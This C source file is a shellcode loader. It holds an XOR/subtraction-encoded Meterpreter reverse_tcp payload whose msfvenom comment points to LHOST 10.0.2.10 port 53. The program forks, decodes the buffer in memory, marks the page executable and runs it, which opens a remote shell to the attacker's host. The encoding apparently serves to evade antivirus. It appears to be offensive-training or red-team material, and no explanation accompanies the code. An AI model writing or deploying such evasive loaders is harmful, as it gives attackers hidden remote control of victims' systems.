#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

// /usr/bin/msfvenom -f c -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=53
unsigned char buf[] = "\x4a\x10\x7d\x12\x63\xa2\xb1\x2b\x53\x92\xd1\x5e\x4a\xd2\x7d\x25\x5a\x6d\x7d\x08\x6d\x20\x06\x53\x86\xdb\x83\x6a\x7d\x1d\x5a\x62\x6b\x7d\x32\x63\xa2\x7d\x05\x70\x7d\x1a\x69\x20\x06\x53\x86\xdb\x83\x44\x53\x98\x53\xc2\x05\x1b\x1b\x36\x1d\x1b\x05\x1d\x6a\x53\x92\xe1\x7d\x2b\x6d\x7d\x3d\x63\x20\x06\x62\x53\x86\xdb\x82\x26\x52\x10\xd2\x77\x23\x58\x7d\x3c\x63\x7d\x1b\x7d\x06\x53\x92\xe8\x53\x4a\xf1\x20\x06\x62\x62\x70\x53\x86\xdb\x82\xc8\x7d\x4f\x63\x7d\x1a\x70\x20\x06\x69\x7d\x89\x6d\x20\x06\x53\x86\xdb\x83\xfe\x10\xe1";

int main(int argc, char **argv)
{
    pid_t pid = fork();

    if (pid == -1) {
        perror("fork");
        return -1;
    }

    if (pid == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        void *aligned_buf = (void *)((intptr_t)buf & ~(pagesize - 1));
        if (mprotect(aligned_buf, pagesize, PROT_READ | PROT_WRITE)) {
            perror("mprotect RW");
            return -1;
        }

        int arraysize = (int) sizeof(buf);
        for (int i = 0; i < arraysize; i++) {
            buf[i] = (buf[i] - 17) & 0xFF;
            buf[i] = buf[i] ^ 0x74;
            buf[i] = (buf[i] - 5) & 0xFF;
            buf[i] = buf[i] ^ 0x79;
        }

        if (mprotect(aligned_buf, pagesize, PROT_READ | PROT_EXEC)) {
            perror("mprotect RX");
            return -1;
        }
        
        int (*ret)() = (int(*)())buf;
        ret();
    }

    return 0;
}